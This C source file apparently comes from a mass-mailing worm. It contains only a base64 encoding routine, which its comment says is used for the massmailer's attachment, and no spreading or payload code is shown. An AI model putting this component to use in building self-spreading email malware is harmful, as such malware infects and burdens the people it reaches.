#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
//base64 encoding algorithm. Used for the massmailer's attachment
void EncodeBase64(char *strFile, char *szPath)
{
	char Alphabet[64]={ 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
						'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
						'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
						'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/' };

	unsigned char bytes[3];
	unsigned int incr,total,total1=0;
	unsigned char char1;


	FILE* fin = fopen(strFile,"rb");
	if(fin==NULL)return;
	FILE* fout = fopen(szPath,"w");
	incr = -1;
	total = 0;
	while(!feof(fin))
	{
		total1++;
		incr++;
		if(incr==3)
		{
			incr = -1;
			char1 = bytes[0] >> 2;
			fprintf(fout,"%c",Alphabet[char1]);
			char1 = ((bytes[0] << 6) | (bytes[1] >> 2));
			char1 = char1 >> 2;
			fprintf(fout,"%c",Alphabet[char1]);
			char1 = bytes[1] << 4;
			char1 = char1 >> 2;
			char1 = char1 | (bytes[2] >> 6);
			fprintf(fout,"%c",Alphabet[char1]);
			char1 = bytes[2] << 2;
			char1 = char1 >> 2;
			fprintf(fout,"%c",Alphabet[char1]);
			total+=4;
		}
		else fscanf(fin,"%c",&bytes[incr]);
		if(total==76)
		{
			total = 0;
			fprintf(fout,"\n");
		}
	}

	
	if (incr==1)
	{
		char1 = bytes[0] >> 2;
		fprintf(fout,"%c",Alphabet[char1]);
		char1 = ((bytes[0] << 6) | 0);
		char1 = char1 >> 2;
		fprintf(fout,"%c==",Alphabet[char1]);
	}
	if (incr==2)
	{
		char1 = bytes[0] >> 2;
		fprintf(fout,"%c",Alphabet[char1]);
		char1 = ((bytes[0] << 6) | (bytes[1] >> 2));
		char1 = char1 >> 2;
		fprintf(fout,"%c",Alphabet[char1]);
		char1 = bytes[1] << 4;
		char1 = char1 >> 2;
		char1 = char1 | 0;
		fprintf(fout,"%c=",Alphabet[char1]);
	}
	fclose(fin);
	fclose(fout);

}
